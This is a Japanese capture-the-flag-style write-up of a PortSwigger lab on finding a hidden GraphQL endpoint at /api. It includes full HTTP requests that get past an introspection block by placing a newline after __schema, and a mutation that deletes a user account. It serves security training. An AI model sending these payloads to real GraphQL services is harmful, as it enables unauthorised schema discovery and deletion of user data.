# 非表示の GraphQL エンドポイントを見つける

次のハッキングラボを実施します  
https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint  
このラボのユーザー管理機能は、非表示の GraphQL エンドポイントを利用しています。サイト内のページをクリックするだけでは、このエンドポイントを見つけることはできません。

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. ハッキングラボで一通りの操作を行い、GraphQL のエンドポイントが公開されていないことを確認します
- 4. GET / リクエストを send to repeater します

* 5. GET /api 　に書き換えて送信します。クエリを受け付けるエンドポイントの存在します。

```
"Query not present"
```

- 6. ユニバーサルクエリに書き換えて送信します。 GraphQL エンドポイントがあることが判明しました。

[リクエスト]

```
GET /api?query=query{__typename} HTTP/2
Host: 0a3a0043035cec2683b912b5004a002d.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

[レスポンス]

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=a82ccmfTWlvsDvnQ5fARgPdj3zoZQxMz; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 45

{
  "data": {
    "__typename": "query"
  }
}
```

- 7. 次のクエリを URL エンコーディングしてリクエスト送信します

```graphql
/api?query=query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

レスポンス

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=jV2PYsOBjardXff0cXl0NBSFYsSyW2G3; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 156

{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

- 8. イントロスペクションのクエリは許可されていないのでスキーマクエリを URL エンコーディングして送信します

```
/api?query=query IntrospectionQuery {
  __schema
 {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

レスポンス

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=haWD52nl9nrqufoznqfZ53ETZHKRs7iS; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 36167

{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      },
      "mutationType": {
        "name": "mutation"
      },
・・・・
```

- 9. イントロスペクションの応答本文を JSON ファイルとして保存します。
- 10. inQL タブでエンドポイントをスキャンします
      ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/65f7123d-acfa-4dd3-9a3e-37c3a803045a)
      次のエンドポイントが検出されます

```graphQL
query {
    getUser(id: Int!) {
        id
        username
    }
}
```

- 11. 次のリクエストを URL エンコーディングして送信します

```
/api?query=query {
	getUser(id:3) {
		id
		username
	}
}
```

レスポンス

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=sJ0s9P4AZH1Js2ccaF1W81Yr04KlCXov; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 84

{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```

- 12. InQL からユーザー削除クエリを見つけます

```
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```

- 13. 以下のクエリを URL エンコーディングして送信するとユーザーが削除できます。

```
/api?query=mutation {
	deleteOrganizationUser(input:{id: 3}) {
		user {
			id
		}
	}
}
```
